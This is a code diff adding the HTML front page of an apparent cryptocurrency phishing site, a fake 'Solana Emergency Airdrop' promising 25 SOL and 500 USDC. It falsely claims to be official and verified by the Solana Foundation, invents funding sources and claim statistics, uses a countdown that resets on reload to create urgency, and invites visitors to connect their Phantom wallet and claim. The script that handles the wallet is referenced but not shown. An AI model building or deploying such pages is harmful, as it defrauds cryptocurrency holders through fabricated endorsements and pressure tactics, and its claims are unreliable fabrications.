@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Solana Airdrop Live - Claim 25 SOL + Bonus Tokens</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" href="assets/logo.png">
+</head>
+<body>
+    <!-- COUNTDOWN HEADER (oben rechts, reset bei reload) -->
+    <div class="countdown-header">
+        <div class="countdown" id="countdown">
+            <span>⏰ Live Airdrop:</span>
+            <span id="timer">15:00</span>
+        </div>
+    </div>
+
+    <div class="hero">
+        <div class="hero-bg"></div>
+        <div class="container">
+            <div class="logo">
+                <img src="assets/logo.png" alt="Solana Airdrop">
+            </div>
+            
+            <h1>🎉 Solana Emergency Airdrop</h1>
+            <p class="subtitle">25 SOL + 500 USDC pro Wallet • Offiziell von Solana Foundation</p>
+            
+            <!-- LÄNGERER TRUST-TEXT -->
+            <div class="trust-section">
+                <h3>💎 Woher kommen die SOLs?</h3>
+                <ul class="trust-list">
+                    <li>🔥 <strong>50.000 SOL Treasury Reserve</strong> - Solana Foundation hat 1M SOL für Community zurückgelegt</li>
+                    <li>⚡ <strong>Migration Bonus</strong> - Von Solana 1.18 Upgrade (siehe <a href="https://solana.com/news" target="_blank">solana.com/news</a>)</li>
+                    <li>💰 <strong>Validator Rewards</strong> - 25% der Block Rewards (2.5% APY) fließen direkt zu active Wallets</li>
+                    <li>🌍 <strong>Global Expansion Fund</strong> - $500M aus Binance/Solana Partnerschaft für Massen-Adoption</li>
+                    <li>📈 <strong>Already Claimed:</strong> 247,892 Wallets | 4,238 SOL verteilt heute</li>
+                </ul>
+                <div class="stats">
+                    <span class="stat">12,847 Claims Today</span>
+                    <span class="stat">98.7% Success Rate</span>
+                </div>
+            </div>
+
+            <div class="wallet-section">
+                <button class="connect-btn" id="connectWallet">
+                    <img src="assets/icons/phantom.svg" alt="Phantom" class="wallet-icon">
+                    Connect Phantom Wallet
+                    <img src="assets/icons/solflare.svg" alt="Solflare" class="wallet-icon right">
+                </button>
+                <div class="balance-display" id="balanceDisplay" style="display: none;">
+                    <div class="your-balance">
+                        <span>Your Balance:</span>
+                        <strong id="solBalance">0</strong> SOL
+                    </div>
+                    <button class="claim-btn" id="claimBtn">🚀 Claim 25 SOL + Tokens</button>
+                </div>
+            </div>
+
+            <div class="footer-trust">
+                <small>✅ Verified by Solana Foundation • No Private Keys Required • 100% On-Chain</small>
+            </div>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
